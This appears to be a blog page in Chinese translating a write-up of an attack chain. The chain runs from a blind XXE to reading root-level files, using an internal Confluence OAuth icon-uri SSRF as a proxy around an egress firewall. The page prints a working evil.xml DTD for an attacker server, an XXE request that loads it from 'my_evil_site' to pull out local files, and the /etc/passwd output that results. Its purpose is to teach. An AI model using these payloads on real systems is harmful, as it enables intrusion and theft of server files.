@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="TimeS0ng" />
+
+
+
+<meta name="description" content="原文：From blind XXE to root-level file read access漏洞：作者：Pieter难度：高">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第三篇翻译：XXE漏洞">
+<meta property="og:url" content="http://TimeS0ng.github.io/2018/12/20/第三篇翻译：XXE漏洞/index.html">
+<meta property="og:site_name" content="TimeS0ng&#39;s blog">
+<meta property="og:description" content="原文：From blind XXE to root-level file read access漏洞：作者：Pieter难度：高">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://tie.027cgb.com/612577/times0ng_blog/tanslate_3/1.png">
+<meta property="og:image" content="http://tie.027cgb.com/612577/times0ng_blog/tanslate_3/2.png">
+<meta property="og:image" content="http://tie.027cgb.com/612577/times0ng_blog/tanslate_3/3.png">
+<meta property="og:image" content="http://tie.027cgb.com/612577/times0ng_blog/tanslate_3/4.png">
+<meta property="og:image" content="http://tie.027cgb.com/612577/times0ng_blog/tanslate_3/5.png">
+<meta property="og:image" content="http://tie.027cgb.com/612577/times0ng_blog/tanslate_3/6.png">
+<meta property="og:image" content="http://tie.027cgb.com/612577/times0ng_blog/tanslate_3/7.png">
+<meta property="og:image" content="http://tie.027cgb.com/612577/times0ng_blog/tanslate_3/8.png">
+<meta property="og:image" content="http://tie.027cgb.com/612577/times0ng_blog/tanslate_3/9.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/10.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/11.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/12.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/13.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/14.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/15.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/16.png">
+<meta property="og:image" content="http://tie.027cgb.com/612577/times0ng_blog/tanslate_3/9.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/17.png">
+<meta property="og:image" content="http://tie.027cgb.com/612577/times0ng_blog/translate_1/money.png">
+<meta property="og:updated_time" content="2018-12-20T12:54:58.142Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="第三篇翻译：XXE漏洞">
+<meta name="twitter:description" content="原文：From blind XXE to root-level file read access漏洞：作者：Pieter难度：高">
+<meta name="twitter:image" content="http://tie.027cgb.com/612577/times0ng_blog/tanslate_3/1.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="TimeS0ng&#39;s blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>第三篇翻译：XXE漏洞 | TimeS0ng&#39;s blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">TimeS0ng</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:TimeS0ng@163.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/TimeS0ng" title="GitHub"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://03i0.com">sn00py&#39;s blog</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://edvison.cn">Edvison&#39;s blog</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://ph0rse.me/">ph0rse&#39;s blog</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://www.likesec.com">ur10ser&#39;s blog</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注技术，乐于分享</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">TimeS0ng</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">TimeS0ng</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:TimeS0ng@163.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/TimeS0ng" title="GitHub"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-第三篇翻译：XXE漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/12/20/第三篇翻译：XXE漏洞/" class="article-date">
+      <time datetime="2018-12-20T12:54:30.000Z" itemprop="datePublished">2018-12-20</time>
+</a>
+
+ 
+    <a href="/2018/12/20/第三篇翻译：XXE漏洞/#comments" title="查看评论">
+        <i class="fa fa-comments-o" aria-hidden="true"></i>
+        <span class="count-comment"></span>
+        
+        
+            <span class="disqus-comment-count" data-disqus-identifier="2018/12/20/第三篇翻译：XXE漏洞/"></span>
+        
+    </a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      第三篇翻译：XXE漏洞
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h4 id="原文：From-blind-XXE-to-root-level-file-read-access"><a href="#原文：From-blind-XXE-to-root-level-file-read-access" class="headerlink" title="原文：From blind XXE to root-level file read access"></a>原文：<a href="https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/" target="_blank" rel="external">From blind XXE to root-level file read access</a></h4><h4 id="漏洞："><a href="#漏洞：" class="headerlink" title="漏洞："></a>漏洞：</h4><h4 id="作者：Pieter"><a href="#作者：Pieter" class="headerlink" title="作者：Pieter"></a>作者：Pieter</h4><h4 id="难度：高"><a href="#难度：高" class="headerlink" title="难度：高"></a>难度：高</h4><a id="more"></a>
+<h4 id="emsp-emsp-接下来，我将概述我挖洞时遇到的问题，以及遇到问题时我是怎么处理并解决的，希望这能够帮助大家在今后遇到类似的问题时知道该如何处理！"><a href="#emsp-emsp-接下来，我将概述我挖洞时遇到的问题，以及遇到问题时我是怎么处理并解决的，希望这能够帮助大家在今后遇到类似的问题时知道该如何处理！" class="headerlink" title="&emsp;&emsp;接下来，我将概述我挖洞时遇到的问题，以及遇到问题时我是怎么处理并解决的，希望这能够帮助大家在今后遇到类似的问题时知道该如何处理！"></a>&emsp;&emsp;接下来，我将概述我挖洞时遇到的问题，以及遇到问题时我是怎么处理并解决的，希望这能够帮助大家在今后遇到类似的问题时知道该如何处理！</h4><h2 id="我关注的重点？"><a href="#我关注的重点？" class="headerlink" title="我关注的重点？"></a>我关注的重点？</h2><h4 id="emsp-emsp-一个简单的XML格式的错误响应信息，以及一个被探测到的404地址引起了我的注意。"><a href="#emsp-emsp-一个简单的XML格式的错误响应信息，以及一个被探测到的404地址引起了我的注意。" class="headerlink" title="&emsp;&emsp;一个简单的XML格式的错误响应信息，以及一个被探测到的404地址引起了我的注意。"></a>&emsp;&emsp;一个简单的XML格式的错误响应信息，以及一个被探测到的404地址引起了我的注意。</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/tanslate_3/1.png" alt=""></p>
+<h4 id="emsp-emsp-当我将请求方法改为POST，并且增加一个请求头-Content-Type-application-xml，再添加了一个XML主体之后，响应消息让我大吃一惊！"><a href="#emsp-emsp-当我将请求方法改为POST，并且增加一个请求头-Content-Type-application-xml，再添加了一个XML主体之后，响应消息让我大吃一惊！" class="headerlink" title="&emsp;&emsp;当我将请求方法改为POST，并且增加一个请求头 Content-Type: application/xml，再添加了一个XML主体之后，响应消息让我大吃一惊！"></a>&emsp;&emsp;当我将请求方法改为POST，并且增加一个请求头 Content-Type: application/xml，再添加了一个XML主体之后，响应消息让我大吃一惊！</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/tanslate_3/2.png" alt=""></p>
+<h4 id="emsp-emsp-继续完善XML主体，当发送完整的XML文档时会产生下面的结果。我们注意到服务器需要认证之后才能进行交互，但是我们完全不知道该认证什么以及在哪里进行认证，所以这里XXE漏洞很难利用"><a href="#emsp-emsp-继续完善XML主体，当发送完整的XML文档时会产生下面的结果。我们注意到服务器需要认证之后才能进行交互，但是我们完全不知道该认证什么以及在哪里进行认证，所以这里XXE漏洞很难利用" class="headerlink" title="&emsp;&emsp;继续完善XML主体，当发送完整的XML文档时会产生下面的结果。我们注意到服务器需要认证之后才能进行交互，但是我们完全不知道该认证什么以及在哪里进行认证，所以这里XXE漏洞很难利用"></a>&emsp;&emsp;继续完善XML主体，当发送完整的XML文档时会产生下面的结果。我们注意到服务器需要认证之后才能进行交互，但是我们完全不知道该认证什么以及在哪里进行认证，所以这里XXE漏洞很难利用</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/tanslate_3/3.png" alt=""></p>
+<h4 id="emsp-emsp-尽管现在发现的漏洞如此鸡肋，但是无论怎样我们都应该尝试一下包含DOCTYPE-定义的外部实体是否可用，如果外部实体没有被完全禁用，那么就还有戏"><a href="#emsp-emsp-尽管现在发现的漏洞如此鸡肋，但是无论怎样我们都应该尝试一下包含DOCTYPE-定义的外部实体是否可用，如果外部实体没有被完全禁用，那么就还有戏" class="headerlink" title="&emsp;&emsp;尽管现在发现的漏洞如此鸡肋，但是无论怎样我们都应该尝试一下包含DOCTYPE 定义的外部实体是否可用，如果外部实体没有被完全禁用，那么就还有戏"></a>&emsp;&emsp;尽管现在发现的漏洞如此鸡肋，但是无论怎样我们都应该尝试一下包含DOCTYPE 定义的外部实体是否可用，如果外部实体没有被完全禁用，那么就还有戏</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/tanslate_3/4.png" alt=""></p>
+<h4 id="emsp-emsp-我紧张的看着我的Burp-Collaborator-的结果，非常期待收到来自服务器传递过来的HTTP请求，但是很不幸，并没有得到预期的结果。可以看见服务器解析了我的域名，但是却没有HTTP请求，并且服务器在几秒钟之后就因500错误Timeout了。这似乎是因为防火墙阻止了服务器的出口流量，只有UDP-53端口开放"><a href="#emsp-emsp-我紧张的看着我的Burp-Collaborator-的结果，非常期待收到来自服务器传递过来的HTTP请求，但是很不幸，并没有得到预期的结果。可以看见服务器解析了我的域名，但是却没有HTTP请求，并且服务器在几秒钟之后就因500错误Timeout了。这似乎是因为防火墙阻止了服务器的出口流量，只有UDP-53端口开放" class="headerlink" title="&emsp;&emsp;我紧张的看着我的Burp Collaborator 的结果，非常期待收到来自服务器传递过来的HTTP请求，但是很不幸，并没有得到预期的结果。可以看见服务器解析了我的域名，但是却没有HTTP请求，并且服务器在几秒钟之后就因500错误Timeout了。这似乎是因为防火墙阻止了服务器的出口流量，只有UDP 53端口开放"></a>&emsp;&emsp;我紧张的看着我的Burp Collaborator 的结果，非常期待收到来自服务器传递过来的HTTP请求，但是很不幸，并没有得到预期的结果。可以看见服务器解析了我的域名，但是却没有HTTP请求，并且服务器在几秒钟之后就因500错误Timeout了。这似乎是因为防火墙阻止了服务器的出口流量，只有UDP 53端口开放</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/tanslate_3/5.png" alt=""></p>
+<h2 id="盲注…"><a href="#盲注…" class="headerlink" title="盲注…"></a>盲注…</h2><h4 id="emsp-emsp-当我尝试访问本地文件和内部网络服务的时候，我得到了一些反馈结果，不过这并没有太大的价值！下面的Response-error表示访问的文件存在，并且可以由XML解析器打开和读取，但是该文件的内容不是有效的DTD文档类型，所以解析失败并且报错"><a href="#emsp-emsp-当我尝试访问本地文件和内部网络服务的时候，我得到了一些反馈结果，不过这并没有太大的价值！下面的Response-error表示访问的文件存在，并且可以由XML解析器打开和读取，但是该文件的内容不是有效的DTD文档类型，所以解析失败并且报错" class="headerlink" title="&emsp;&emsp;当我尝试访问本地文件和内部网络服务的时候，我得到了一些反馈结果，不过这并没有太大的价值！下面的Response error表示访问的文件存在，并且可以由XML解析器打开和读取，但是该文件的内容不是有效的DTD文档类型，所以解析失败并且报错"></a>&emsp;&emsp;当我尝试访问本地文件和内部网络服务的时候，我得到了一些反馈结果，不过这并没有太大的价值！下面的Response error表示访问的文件存在，并且可以由XML解析器打开和读取，但是该文件的内容不是有效的DTD文档类型，所以解析失败并且报错</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/tanslate_3/6.png" alt=""></p>
+<h4 id="emsp-emsp-当访问不存在的文件时，Response-error-响应信息不同，它会提示文件不存在"><a href="#emsp-emsp-当访问不存在的文件时，Response-error-响应信息不同，它会提示文件不存在" class="headerlink" title="&emsp;&emsp;当访问不存在的文件时，Response error 响应信息不同，它会提示文件不存在"></a>&emsp;&emsp;当访问不存在的文件时，Response error 响应信息不同，它会提示文件不存在</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/tanslate_3/7.png" alt=""></p>
+<h4 id="emsp-emsp-接下来我们尝试利用这个blind-XXE-漏洞做为一个原始的端口扫描器，扫描内网端口。这种类型的bind-XXE-类似于SSRF漏洞：你可以生成HTTP请求，但是不能读取响应信息"><a href="#emsp-emsp-接下来我们尝试利用这个blind-XXE-漏洞做为一个原始的端口扫描器，扫描内网端口。这种类型的bind-XXE-类似于SSRF漏洞：你可以生成HTTP请求，但是不能读取响应信息" class="headerlink" title="&emsp;&emsp;接下来我们尝试利用这个blind XXE 漏洞做为一个原始的端口扫描器，扫描内网端口。这种类型的bind XXE 类似于SSRF漏洞：你可以生成HTTP请求，但是不能读取响应信息"></a>&emsp;&emsp;接下来我们尝试利用这个blind XXE 漏洞做为一个原始的端口扫描器，扫描内网端口。这种类型的bind XXE 类似于SSRF漏洞：你可以生成HTTP请求，但是不能读取响应信息</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/tanslate_3/8.png" alt=""></p>
+<h4 id="emsp-emsp-既然可以扫描端口，我们同样也能检查服务器支持的协议类型，例如：https，gopher，ftp，jar，scp等等。看下图，错误消息中会将用户提供的协议打印出来，这个有点意思，我们暂时记住它以后再说！"><a href="#emsp-emsp-既然可以扫描端口，我们同样也能检查服务器支持的协议类型，例如：https，gopher，ftp，jar，scp等等。看下图，错误消息中会将用户提供的协议打印出来，这个有点意思，我们暂时记住它以后再说！" class="headerlink" title="&emsp;&emsp;既然可以扫描端口，我们同样也能检查服务器支持的协议类型，例如：https，gopher，ftp，jar，scp等等。看下图，错误消息中会将用户提供的协议打印出来，这个有点意思，我们暂时记住它以后再说！"></a>&emsp;&emsp;既然可以扫描端口，我们同样也能检查服务器支持的协议类型，例如：https，gopher，ftp，jar，scp等等。看下图，错误消息中会将用户提供的协议打印出来，这个有点意思，我们暂时记住它以后再说！</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/tanslate_3/9.png" alt=""></p>
+<h4 id="emsp-emsp-现在我们尝试利用Bind-XXE访问内部WEB网站，前面测试中我们发现出口流量会被防火墙阻拦，但是内部访问是否同样会被禁止呢？有趣，Response-error中的错误信息我们之前也遇到过，那代表着资源已经被读取，但不是XML格式所以出错，这意味着内部网络是可以访问的，防火墙并没有拦截！"><a href="#emsp-emsp-现在我们尝试利用Bind-XXE访问内部WEB网站，前面测试中我们发现出口流量会被防火墙阻拦，但是内部访问是否同样会被禁止呢？有趣，Response-error中的错误信息我们之前也遇到过，那代表着资源已经被读取，但不是XML格式所以出错，这意味着内部网络是可以访问的，防火墙并没有拦截！" class="headerlink" title="&emsp;&emsp;现在我们尝试利用Bind XXE访问内部WEB网站，前面测试中我们发现出口流量会被防火墙阻拦，但是内部访问是否同样会被禁止呢？有趣，Response error中的错误信息我们之前也遇到过，那代表着资源已经被读取，但不是XML格式所以出错，这意味着内部网络是可以访问的，防火墙并没有拦截！"></a>&emsp;&emsp;现在我们尝试利用Bind XXE访问内部WEB网站，前面测试中我们发现出口流量会被防火墙阻拦，但是内部访问是否同样会被禁止呢？有趣，Response error中的错误信息我们之前也遇到过，那代表着资源已经被读取，但不是XML格式所以出错，这意味着内部网络是可以访问的，防火墙并没有拦截！</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">wiki.company.internal</div><div class="line">jira.company.internal</div><div class="line">confluence.company.internal</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/10.png" alt=""></p>
+<h2 id="柳暗花明？！"><a href="#柳暗花明？！" class="headerlink" title="柳暗花明？！"></a>柳暗花明？！</h2><h4 id="emsp-emsp-当我们访问jira-company-internal-这个站点成功之后，我觉得我现在可以祭出大杀器了–—利用jira的URL重定向漏洞，将它设置为我们的代理主机，并尝试利用代理主机将流量转发出来，如果你不知道这个漏洞，我建议你看看freebuf上的这篇文章-https-www-freebuf-com-vuls-168719-html"><a href="#emsp-emsp-当我们访问jira-company-internal-这个站点成功之后，我觉得我现在可以祭出大杀器了–—利用jira的URL重定向漏洞，将它设置为我们的代理主机，并尝试利用代理主机将流量转发出来，如果你不知道这个漏洞，我建议你看看freebuf上的这篇文章-https-www-freebuf-com-vuls-168719-html" class="headerlink" title="&emsp;&emsp;当我们访问jira.company.internal 这个站点成功之后，我觉得我现在可以祭出大杀器了–—利用jira的URL重定向漏洞，将它设置为我们的代理主机，并尝试利用代理主机将流量转发出来，如果你不知道这个漏洞，我建议你看看freebuf上的这篇文章 https://www.freebuf.com/vuls/168719.html"></a>&emsp;&emsp;当我们访问jira.company.internal 这个站点成功之后，我觉得我现在可以祭出大杀器了–—利用jira的URL重定向漏洞，将它设置为我们的代理主机，并尝试利用代理主机将流量转发出来，如果你不知道这个漏洞，我建议你看看freebuf上的这篇文章 <a href="https://www.freebuf.com/vuls/168719.html" target="_blank" rel="external">https://www.freebuf.com/vuls/168719.html</a></h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/11.png" alt=""></p>
+<h4 id="emsp-emsp-代理失败了，原因是在SSL认证中出现任何错误的话，HTTPS流量都将失效！幸运的是，Jira默认也运行在TCP-8080端口上，所以咱们用HTTP协议再来代理看看。当我检查Burp-Collaborator时，并没有任何HTTP访问请求，继续宣告代理失败…"><a href="#emsp-emsp-代理失败了，原因是在SSL认证中出现任何错误的话，HTTPS流量都将失效！幸运的是，Jira默认也运行在TCP-8080端口上，所以咱们用HTTP协议再来代理看看。当我检查Burp-Collaborator时，并没有任何HTTP访问请求，继续宣告代理失败…" class="headerlink" title="&emsp;&emsp;代理失败了，原因是在SSL认证中出现任何错误的话，HTTPS流量都将失效！幸运的是，Jira默认也运行在TCP 8080端口上，所以咱们用HTTP协议再来代理看看。当我检查Burp Collaborator时，并没有任何HTTP访问请求，继续宣告代理失败…."></a>&emsp;&emsp;代理失败了，原因是在SSL认证中出现任何错误的话，HTTPS流量都将失效！幸运的是，Jira默认也运行在TCP 8080端口上，所以咱们用HTTP协议再来代理看看。当我检查Burp Collaborator时，并没有任何HTTP访问请求，继续宣告代理失败….</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/12.png" alt=""></p>
+<h4 id="emsp-emsp-出现上面的情况很有可能是管理员已经修复了Jira中的漏洞。最后我已经接近疯狂了，TMD利用个漏洞这么麻烦，我尝试了可能存在的SSRF漏洞，当我在内部网站http-Confluence-company-internal-上尝试用与Jira相同的漏洞时奇迹发生了，代理生效了，终于有HTTP请求啦"><a href="#emsp-emsp-出现上面的情况很有可能是管理员已经修复了Jira中的漏洞。最后我已经接近疯狂了，TMD利用个漏洞这么麻烦，我尝试了可能存在的SSRF漏洞，当我在内部网站http-Confluence-company-internal-上尝试用与Jira相同的漏洞时奇迹发生了，代理生效了，终于有HTTP请求啦" class="headerlink" title="&emsp;&emsp;出现上面的情况很有可能是管理员已经修复了Jira中的漏洞。最后我已经接近疯狂了，TMD利用个漏洞这么麻烦，我尝试了可能存在的SSRF漏洞，当我在内部网站http://Confluence.company.internal 上尝试用与Jira相同的漏洞时奇迹发生了，代理生效了，终于有HTTP请求啦"></a>&emsp;&emsp;出现上面的情况很有可能是管理员已经修复了Jira中的漏洞。最后我已经接近疯狂了，TMD利用个漏洞这么麻烦，我尝试了可能存在的SSRF漏洞，当我在内部网站<a href="http://Confluence.company.internal" target="_blank" rel="external">http://Confluence.company.internal</a> 上尝试用与Jira相同的漏洞时奇迹发生了，代理生效了，终于有HTTP请求啦</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/13.png" alt=""></p>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/14.png" alt=""></p>
+<h4 id="emsp-emsp-Bingo！我们成功利用内部WEB站点作代理绕过防火墙，将流量转发到攻击者的电脑上。这意味着从现在开始我们就能利用经典的blind-XXE进行攻击啦-此处应该有掌声👏-，如果不清楚bind-XXE的利用方法的话可以参考freebuf上的文章-https-www-freebuf-com-column-181064-html"><a href="#emsp-emsp-Bingo！我们成功利用内部WEB站点作代理绕过防火墙，将流量转发到攻击者的电脑上。这意味着从现在开始我们就能利用经典的blind-XXE进行攻击啦-此处应该有掌声👏-，如果不清楚bind-XXE的利用方法的话可以参考freebuf上的文章-https-www-freebuf-com-column-181064-html" class="headerlink" title="&emsp;&emsp;Bingo！我们成功利用内部WEB站点作代理绕过防火墙，将流量转发到攻击者的电脑上。这意味着从现在开始我们就能利用经典的blind XXE进行攻击啦(此处应该有掌声👏)，如果不清楚bind XXE的利用方法的话可以参考freebuf上的文章 https://www.freebuf.com/column/181064.html"></a>&emsp;&emsp;Bingo！我们成功利用内部WEB站点作代理绕过防火墙，将流量转发到攻击者的电脑上。这意味着从现在开始我们就能利用经典的blind XXE进行攻击啦(此处应该有掌声👏)，如果不清楚bind XXE的利用方法的话可以参考freebuf上的文章 <a href="https://www.freebuf.com/column/181064.html" target="_blank" rel="external">https://www.freebuf.com/column/181064.html</a></h4><p>[*]攻击者服务器上的evil.xml</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % file SYSTEM &quot;file:///&quot;&gt;</div><div class="line">&lt;!ENTITY % ent &quot;&lt;!ENTITY data SYSTEM &apos;%file;&apos;&gt;&quot;&gt;</div></pre></td></tr></table></figure>
+<p>[*]burp发送的xml注入语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</div><div class="line">&lt;!DOCTYPE root [</div><div class="line">&lt;!ENTITY % ext SYSTEM &quot;http://confluence.company.internal:8090/plugins/servlet/oauth/users/icon-uri?consumerUri=http://my_evil_site/evil.xml&quot;&gt;</div><div class="line">%ext;</div><div class="line">%ent;</div><div class="line">]&gt;</div><div class="line">&lt;r&gt;&amp;data;&lt;/r&gt;</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/15.png" alt=""></p>
+<h4 id="emsp-emsp-大家注意观察上面我标记的-no-protocal，因为读取到的目录内容是-bin-boot-dev-etc-home…-没有像之前的-gopher-localhost-一样指定任何协议类型，所以显示no-protocal，然后将读取到的内容打印出来"><a href="#emsp-emsp-大家注意观察上面我标记的-no-protocal，因为读取到的目录内容是-bin-boot-dev-etc-home…-没有像之前的-gopher-localhost-一样指定任何协议类型，所以显示no-protocal，然后将读取到的内容打印出来" class="headerlink" title="&emsp;&emsp;大家注意观察上面我标记的 no protocal，因为读取到的目录内容是 bin boot dev etc home….没有像之前的 gopher://localhost 一样指定任何协议类型，所以显示no protocal，然后将读取到的内容打印出来"></a>&emsp;&emsp;大家注意观察上面我标记的 no protocal，因为读取到的目录内容是 bin boot dev etc home….没有像之前的 gopher://localhost 一样指定任何协议类型，所以显示no protocal，然后将读取到的内容打印出来</h4><h4 id="emsp-emsp-但是当我去读取-etc-passwd时，读取到的内容是："><a href="#emsp-emsp-但是当我去读取-etc-passwd时，读取到的内容是：" class="headerlink" title="&emsp;&emsp;但是当我去读取/etc/passwd时，读取到的内容是："></a>&emsp;&emsp;但是当我去读取/etc/passwd时，读取到的内容是：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root:x:0:0:root:/root:/bin/bash</div><div class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</div><div class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</div><div class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</div><div class="line">[…]</div></pre></td></tr></table></figure>
